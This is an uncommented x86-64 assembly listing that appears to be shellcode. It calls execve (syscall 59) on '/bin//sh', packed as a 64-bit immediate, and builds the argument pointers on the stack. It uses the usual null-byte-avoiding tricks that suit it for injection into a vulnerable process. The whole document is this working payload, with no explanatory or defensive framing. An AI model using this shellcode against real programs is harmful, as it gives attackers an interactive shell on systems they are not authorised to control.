.code64
.section .text
	.globl _start
_start:
	push $59
	popq %rax
        cqto
        pushq %rdx
        movabsq $0x68732f2f6e69622f, %rdi
        pushq %rdi
        movq %rsp, %rdi
        pushq %rdx
	movq %rsp, %rdx
	pushq %rdi
        movq %rsp, %rsi
        syscall
